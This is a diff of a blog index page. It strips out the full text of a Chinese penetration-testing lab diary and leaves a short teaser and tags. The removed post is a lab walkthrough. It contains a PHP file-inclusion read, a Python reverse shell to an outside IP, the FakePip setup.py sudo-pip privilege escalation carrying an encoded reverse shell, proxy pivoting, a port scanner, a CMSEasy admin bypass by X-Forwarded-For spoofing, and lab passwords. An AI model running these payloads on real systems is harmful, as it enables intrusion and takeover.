@@ -187,9 +187,18 @@
 
 <div class="post">
     <a href="/2024/11/10/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/">
-        <h2 class="post-title"></h2>
+        <h2 class="post-title">渗透靶场日记 01</h2>
     </a>
     <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
         
         <span class="date">
             <span class="icon">
@@ -203,381 +212,22 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>网络拓扑结构如下：</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/1.png" alt="img"></p>
-<p>首先扫出来<code>192.168.1.7</code>有服务，源码看到一个疑似接口<code>?lang</code>和敏感信息（user）<code>mamadou</code></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/2.png" alt="img"></p>
-<p>不能rce但是可以<strong>filter文件包含</strong>，<code>dirb http://192.168.1.7/?lang=</code>（这里http和https扫出来的东西是不一样的）扫出来<strong>index</strong></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/3.png" alt="img"></p>
-<pre><code class="Plain">http://192.168.1.7/?lang=php://filter/read/convert.base64-encode/resource=index
-</code></pre>
-<p>base64解开拿到passwd<code>Niamey4Ever227!!!</code></p>
-<pre><code class="PHP">&lt;?php
-$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it
-if (isset($_GET[&#39;lang&#39;]))
-&#123;
-include($_GET[&#39;lang&#39;].&quot;.php&quot;);
-&#125;
-?&gt;
-</code></pre>
-<p>用nmap扫一下<code>192.168.1.7</code>，<code>nmap -sT -Pn 192.168.1.7</code>，除了80端口以外，<code>111</code>和<code>3333</code>也有服务</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/4.png" alt="img"></p>
-<p>尝试利用上面的信息登录，3333端口成功登录</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/5.png" alt="img"></p>
-<p>发现是一个python2.x的服务，用<strong>pty</strong>造一个交互shell，达到<code>flag1</code></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/6.png" alt="img"></p>
-<pre><code class="Python">import pty
-pty.spawn(&quot;/bin/bash&quot;)
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/7.png" alt="img"></p>
-<pre><code>cat /etc/passwd`发现新用户`devops
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/8.png" alt="img"></p>
-<p>跟进去发现<code>flag2.txt</code>无法读取</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/9.png" alt="img"></p>
-<p>查devops用户下的文件<code>find / -user devops 2&gt;/dev/null</code></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/10.png" alt="img"></p>
-<p><code>/srv/.antivirus.py</code>可读可写，<code>find / -name *antivirus* 2&gt;/dev/null</code>查看发现有对应的service</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/11.png" alt="img"></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/12.png" alt="img"></p>
-<p>是个定时任务，300s启动一次<code>antivirus.py</code>，于是我们改写<code>antivirus.py</code>的内容，等待几分钟就可以了</p>
-<pre><code class="Python">f=open(&#39;/home/devops/flag2.txt&#39;,&#39;r&#39;).read()
-open(&#39;/tmp/flag2.txt&#39;,&#39;w&#39;).write(f)
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/13.png" alt="img"></p>
-<p>进一步弹个shell</p>
-<pre><code class="Python">import socket,subprocess,os
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;99.99.99.99&quot;,1235))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/14.png" alt="img"></p>
-<p>接着尝试能否将devops用户提权<code>root</code>，<code>sudo -l</code>查</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/15.png" alt="img"></p>
-<pre><code>pip`命令是`NOPASSWD`的，可以使用`fakepip`https://github.com/0x00-0x00/FakePip打，伪造`setup.py
-</code></pre>
-<p>另外如果需要使用别的命令提权可以来这儿找找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
-<pre><code class="Python">from setuptools import setup
-from setuptools.command.install import install
-import base64
-import os
-
-class CustomInstall(install):
-  def run(self):
-    install.run(self)
-    LHOST = &#39;localhost&#39;  # change this
-    LPORT = 13372
-    
-    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\&#39;&#123;LHOST&#125;\&#39;, &#123;LPORT&#125;)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39;.format(LHOST=LHOST,LPORT=LPORT)
-    encoded = base64.b64encode(reverse_shell)
-    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)
-
-setup(name=&#39;FakePip&#39;,
-      version=&#39;0.0.1&#39;,
-      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,
-      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,
-      author=&#39;zc00l&#39;,
-      author_email=&#39;andre.marques@esecurity.com.br&#39;,
-      license=&#39;MIT&#39;,
-      zip_safe=False,
-      cmdclass=&#123;&#39;install&#39;: CustomInstall&#125;)
-</code></pre>
-<p>kali本地存好exp，python启一个http服务<code>python3 -m http.server 8000</code>，<code>wget</code>传到shell里</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/16.png" alt="img"></p>
-<p>改掉<code>localhost-&gt;99.99.99.99</code>，<code>sudo /usr/bin/pip install . --upgrade --force-reinstall</code>，kali机监听<code>13372</code>端口</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/17.png" alt="img"></p>
-<p>拿到<code>root</code>权限</p>
-<p>接着配置<code>frp</code>代理，<code>wget</code>传到<code>root</code>权限shell中</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/18.png" alt="img"></p>
-<p>建立代理服务端<code>./frps -c ./frps.ini</code></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/19.png" alt="img"></p>
-<p>连接服务端</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/20.png" alt="img"></p>
-<p>成功连接后设置<code>proxychains</code>配置文件，新增一条<code>socks5</code>记录</p>
-<pre><code>vim /etc/proxychains.conf
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/21.png" alt="img"></p>
-<p>找个scan.py开扫<code>proxychains python scan.py 192.168.1.1 192.168.1.10 -t 20</code>（要加proxychains走代理）</p>
-<pre><code class="Python">!/usr/bin/env python
-# -*- encoding: utf-8 -*-
-import Queue
-import threading
-from threading import Thread
-import time
-import re
-import sys
-import os
-import socket
-import optparse
-import urllib2
-import socks
-
-&#39;&#39;&#39;
-一般默认常用端口扫描介绍：
-3311:3312 kangle主机管理系统
-3389 远程登录
-4440 rundeck是用java写的开源工具
-5672 rabbitMQ
-5900 VNC
-6082 varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网
-6379 redis 一般无认证，可直接访问
-7001 weblogic
-8080 tomcat
-8089 jboss
-8161 activeMQ
-8649 ganglia集群系统监控软件
-9000 fastcgi服务
-9090 IBM服务
-9200,9300 elasticsearch  参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞
-9999 amg加密版
-10050 zabbix
-11211  memcache  未授权访问
-27017,28017 mongodb  未授权访问   mongodb默认无口令登录
-3777 大华监控设备
-50000 sap netweaver远程命令执行漏洞
-50060 50070 hahoop、apache hasoop
-21 默认是ftp端口  主要看是否支持匿名，也可以跑弱口令
-22 默认是ssh端口
-23 默认是telnet端口
-25 默认是smtp服务
-53 默认是DNS
-123 是NTP
-161,162，8161 snmp服务（8161 IBM一款产品所开放的SNMP）
-389 ldap团体
-443  openssl  、hearthleed
-445 永恒之蓝
-512,513 rlogin服务或者是exec
-873 rsync 主要看是否支持匿名，也可以跑弱口令
-1433 mssql数据库
-1080 socks代理
-1521 oracle
-1900 bes默认后台
-2049 nfs服务
-2601,2604 zebra路由 默认密码zebra
-2082,2083 cpanel主机管理系统
-3128，3312 squid代理默认端口，如果没设置口令很可能就直接漫游内网了
-3306 mysql数据库
-4899 R-admin 连接端
-4440 rundeck rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网
-8834 nessus
-4848 glashfish
-&#39;&#39;&#39;
-
-
-def ip2num(ip):
-    ip = [int(x) for x in ip.split(&#39;.&#39;)]
-    return ip[0] &lt;&lt; 24 | ip[1] &lt;&lt; 16 | ip[2] &lt;&lt; 8 | ip[3]
-    
-def num2ip(num):
-    return &#39;%s.%s.%s.%s&#39; % ((num &amp; 0xff000000) &gt;&gt; 24,
-                            (num &amp; 0x00ff0000) &gt;&gt; 16,
-                            (num &amp; 0x0000ff00) &gt;&gt; 8,
-                            num &amp; 0x000000ff)
-
-def bThread():
-    global queue
-    global SETTHREAD
-    print &#39;[Note] Running...\n&#39;
-    sav_log(&#39;[Note] Running...\n&#39;)
-    threadl = []
-    threadl = [tThread(queue) for x in xrange(0, int(SETTHREAD))]
-    for t in threadl:
-        t.start()
-    for t in threadl:
-        t.join()
-
-#输入到结束
-def ip_range(start, end):
-    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num &amp; 0xff]
-# http请求获取返回内容
-&#39;&#39;&#39;
-return [0] 文件内容
-return [1] 返回服务状态码
-return [2] 返回服务器类型
-return [3] location
-return [4] title
-&#39;&#39;&#39;
-&#39;&#39;&#39;port scan&#39;&#39;&#39;
-def scan_open_port_server():
-    global lock
-    while True:
-        host,port=queue.get()
-        ss=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ss.settimeout(2)
-        try:
-            ss.connect((host,port))
-            lock.acquire()
-            sav_log(&quot;%s 开放端口 %s   %s&quot; % (host, port,PORT[port]))
-            lock.release()
-            ss.close()
-        except:
-            pass
-        queue.task_done()
-
-def sav_log(content):
-    filename = &quot;log.txt&quot;
-    with open(filename,&quot;a&quot;) as file:
-        file.write(content+&quot;\n&quot;)
-
-def sock_reg():
-    SOCKS_PROXY_HOST = &#39;127.0.0.1&#39;
-    SOCKS_PROXY_PORT = 1234
-    default_socket = socket.socket
-    socks.set_default_proxy(socks.SOCKS5, SOCKS_PROXY_HOST,SOCKS_PROXY_PORT)
-    socket.socket = socks.socksocket
-
-if __name__ == &#39;__main__&#39;:
-    usage=&quot;usage: mul_scan.py  192.168.1.1 192.168.1.254 -t 20&quot;
-    parser = optparse.OptionParser(usage=usage)
-    parser.add_option(&quot;-t&quot;, &quot;--threads&quot;, dest=&quot;NUM&quot;,help=&quot;Maximum threads, default 20&quot;)
-    parser.add_option(&quot;-b&quot;, &quot;--start-ip&quot;, dest=&quot;startIp&quot;,help=&quot;start_ip&quot;)
-    parser.add_option(&quot;-e&quot;, &quot;--end-ip&quot;, dest=&quot;endIp&quot;,help=&quot;end_ip&quot;)
-    parser.add_option(&quot;-x&quot;, &quot;--proxy-socks5&quot;, dest=&quot;soc&quot;,help=&quot;-x socks5&quot;,type =&quot;string&quot;)
-    (options, args) = parser.parse_args()
-    if len(args) &lt; 1:
-        parser.print_help()
-        sys.exit()
-    if options.NUM!=None and int(options.NUM)!=0:
-        SETTHREAD=int(options.NUM)
-        print &quot;SETTHREAD:&quot;+str(SETTHREAD)+&quot;\n&quot;
-    else:
-        SETTHREAD=20
-    if options.soc!=None and options.soc==&quot;socks5&quot;:
-        sock_reg() 
-        print &quot;socks5&quot;   
-    
-    #日志格式化
-    filename = &quot;log.txt&quot;
-    if (os.path.exists(&quot;./&quot;+filename)):
-        os.remove(&quot;./&quot;+filename) 
-
-    
-    #接受开始ip和结束ip         
-    startIp =str(options.startIp)
-    endIp = str(options.endIp)
-    startIp=args[0]
-    endIp=args[1]
-    lock = threading.Lock()
-    #程序运行时间
-    PORT=&#123;445:&quot;Smb&quot;,80:&quot;Web&quot;,8080:&quot;Web&quot;,3311:&quot;kangle主机管理系统&quot;,3312:&quot;kangle主机管理系统&quot;,3389:&quot;远程登录&quot;,4440:&quot;rundeck是用java写的开源工具&quot;,5672:&quot;rabbitMQ&quot;,5900:&quot;vnc&quot;,6082:&quot;varnish&quot;,7001:&quot;weblogic&quot;,8161:&quot;activeMQ&quot;,8649:&quot;ganglia&quot;,9000:&quot;fastcgi&quot;,9090:&quot;ibm&quot;,9200:&quot;elasticsearch&quot;,9300:&quot;elasticsearch&quot;,9999:&quot;amg&quot;,10050:&quot;zabbix&quot;,11211:&quot;memcache&quot;,27017:&quot;mongodb&quot;,28017:&quot;mondodb&quot;,3777:&quot;大华监控设备&quot;,50000:&quot;sap netweaver&quot;,50060:&quot;hadoop&quot;,50070:&quot;hadoop&quot;,21:&quot;ftp&quot;,22:&quot;ssh&quot;,23:&quot;telnet&quot;,25:&quot;smtp&quot;,53:&quot;dns&quot;,123:&quot;ntp&quot;,161:&quot;snmp&quot;,8161:&quot;snmp&quot;,162:&quot;snmp&quot;,389:&quot;ldap&quot;,443:&quot;ssl&quot;,512:&quot;rlogin&quot;,513:&quot;rlogin&quot;,873:&quot;rsync&quot;,1433:&quot;mssql&quot;,1080:&quot;socks&quot;,1521:&quot;oracle&quot;,1900:&quot;bes&quot;,2049:&quot;nfs&quot;,2601:&quot;zebra&quot;,2604:&quot;zebra&quot;,2082:&quot;cpanle&quot;,2083:&quot;cpanle&quot;,3128:&quot;squid&quot;,3312:&quot;squid&quot;,3306:&quot;mysql&quot;,4899:&quot;radmin&quot;,8834:&#39;nessus&#39;,4848:&#39;glashfish&#39;&#125;
-    starttime=time.time()
-    queue = Queue.Queue()
-    iplist = ip_range(startIp, endIp)
-    sav_log(&#39;端口采用默认扫描请自行进行比对:\nbegin Scan &#39;+str(len(iplist))+&quot; ip...&quot;)
-    for i in xrange(SETTHREAD):
-        st1 = threading.Thread(target=scan_open_port_server)
-        st1.setDaemon(True)
-        st1.start()
-    for host in iplist:
-        for port in PORT.keys():
-            queue.put((host,port))
-    queue.join()
-    sav_log(&#39;All RUN TIME：&#39;+str(time.time()-starttime))
-</code></pre>
-<p>扫到<code>.6</code>和<code>.8</code>开放<code>80</code>端口有服务</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/22.png" alt="img"></p>
-<p><code>.6</code>是个<code>CMSEASY</code>服务，还在kali<code>proxychains firefox</code>进</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/23.png" alt="img"></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/24.png" alt="img"></p>
-<p>版本太老了，可用的洞好多，这里用一个<strong>越权漏洞</strong>打</p>
-<p>下一份源码，在<code>/lib/admin/admin.php</code>可以看到</p>
-<pre><code class="PHP">if (!defined(&#39;ROOT&#39;)) exit(&#39;Can\&#39;t Access !&#39;);
-abstract class admin extends act &#123;
-    function __construct() &#123;
-        if (ADMIN_DIR!=config::get(&#39;admin_dir&#39;)) &#123;
-            config::modify(array(&#39;admin_dir&#39;=&gt;ADMIN_DIR));
-            front::flash(&#39;后台目录更改成功！&#39;);
-        &#125;
-        front::$rewrite=false;
-        parent::__construct();
-        $servip = gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]);
-        //if($this instanceof file_admin &amp;&amp; in_array(front::get(&#39;act&#39;), array(&#39;updialog&#39;,&#39;upfile&#39;,&#39;upfilesave&#39;,&#39;netfile&#39;,&#39;netfilesave&#39;,&#39;swfsave&#39;))) return;
-        if($servip==front::ip()&amp;&amp;front::get(&#39;ishtml&#39;)==1) return;
-        $this-&gt;check_admin();
-    &#125;
-    function check_admin() &#123;
-        if (cookie::get(&#39;login_username&#39;)&amp;&amp;cookie::get(&#39;login_password&#39;)) &#123;
-            $user=new user();
-            $user=$user-&gt;getrow(array(&#39;username&#39;=&gt;cookie::get(&#39;login_username&#39;)));
-            $roles = session::get(&#39;roles&#39;);
-            if ($roles &amp;&amp; is_array($user)&amp;&amp;cookie::get(&#39;login_password&#39;)==front::cookie_encode($user[&#39;password&#39;])) &#123;
-                $this-&gt;view-&gt;user=$user;
-                front::$user=$user;
-            &#125;else&#123;
-                $user=null;
-            &#125;
-        &#125;
-        if (!isset($user)||!is_array($user)) &#123;
-            front::redirect(url::create(&#39;admin/login&#39;));
-        &#125;
-    &#125;
-&#125;
-</code></pre>
-<p><code>check_admin</code>这个函数用来验证管理员是否登录</p>
-<pre><code class="PHP">if($servip==front::ip()&amp;&amp;front::get(&#39;ishtml&#39;)==1) return;
-$this-&gt;check_admin();
-</code></pre>
-<p>在这里看到，如果当前ip是<code>$servip</code>，即服务器ip，且<code>ishtml==1</code>就直接<code>return</code>，没有走下面<code>check_admin</code>函数的检查</p>
-<p>再跟进看<code>cmseasy</code>获取当前ip的方法</p>
-<pre><code class="PHP">static function ip() &#123;
-        if ($_SERVER[&#39;HTTP_CLIENT_IP&#39;]) &#123;
-            $onlineip = $_SERVER[&#39;HTTP_CLIENT_IP&#39;];
-        &#125;
-        elseif ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) &#123;
-            $onlineip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-        &#125;
-        elseif ($_SERVER[&#39;REMOTE_ADDR&#39;]) &#123;
-            $onlineip = $_SERVER[&#39;REMOTE_ADDR&#39;];
-        &#125;
-        else &#123;
-            $onlineip = $_SERVER[&#39;REMOTE_ADDR&#39;];
-        &#125;
-        if(config::get(&#39;ipcheck_enable&#39;))&#123;
-            if(!preg_match(&#39;/^(([0-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\.)&#123;3&#125;([0-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])$/&#39;, $onlineip))&#123;
-                exit(&#39;来源非法&#39;);
-            &#125;
-        &#125;
-        return $onlineip;
-    &#125;
-elseif ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])`，于是我们直接伪造`HTTP_X_FORWARDED_FOR`为`192.168.1.6
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/25.png" alt="img"></p>
-<p>payload：</p>
-<pre><code>/index.php?admin_dir=admin&amp;site=default&amp;ishtml=1
-</code></pre>
-<p>登进后台</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/26.png" alt="img"></p>
-<p>源码里有flag</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/27.png" alt="img"></p>
-<p>实际上现在只是登录了后台，并不是管理员身份，跳到其他页面仍然需要身份验证，但我们仍可以通过上述构造思路绕过，翻一翻发现语言设置页面给了写好的马</p>
-<pre><code>case=language&amp;act=edit&amp;table=orders&amp;admin_dir=admin&amp;site=default&amp;ishtml=1
-</code></pre>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/28.png" alt="img"></p>
-<p>然后很抽象，本来写进去的马实际上叫<code>administrator233.php</code>。。。</p>
-<p><code>AntSword</code>设置<code>socks5</code>然后连上马</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/29.png" alt="img"></p>
-<p>成功上线</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/30.png" alt="img"></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/31.png" alt="img"></p>
-<p>查<code>/config/config.php</code>看到数据库信息<code>&#39;password&#39;=&gt;&#39;Simplexue123&#39;</code>和flag3</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/32.png" alt="img"></p>
-<p>上线数据库，找到flag4</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/33.png" alt="img"></p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/34.png" alt="img"></p>
-<p>最后<code>/etc/flag</code>里面还有flag5</p>
-<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/35.png" alt="img"></p>
-<p><code>.8</code>的服务是个数据库，服务连不上了，看了一眼都是<code>sqlmap</code>可以做的简单web，跟渗透没关系不打了</p>
-
+            <p>复健一套渗透靶场🎯</p>
             
         </div>
     </div>
     <div class="post-tags">
         
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
         
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00bcd4">渗透测试</a>
+        </span>
         
     </div>
     <a href="/2024/11/10/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/" class="go-post">阅读全文</a>
@@ -624,7 +274,7 @@ elseif ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])`，于是我们直接伪造`HT
         
         <span class="tag">
             
-            <a href="/tags/Cryptography/" style="color: #03a9f4">Cryptography</a>
+            <a href="/tags/Cryptography/" style="color: #00a596">Cryptography</a>
         </span>
         
     </div>
@@ -672,7 +322,7 @@ elseif ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])`，于是我们直接伪造`HT
         
         <span class="tag">
             
-            <a href="/tags/Friend-Links/" style="color: #ff7d73">Friend Links</a>
+            <a href="/tags/Friend-Links/" style="color: #00a596">Friend Links</a>
         </span>
         
     </div>
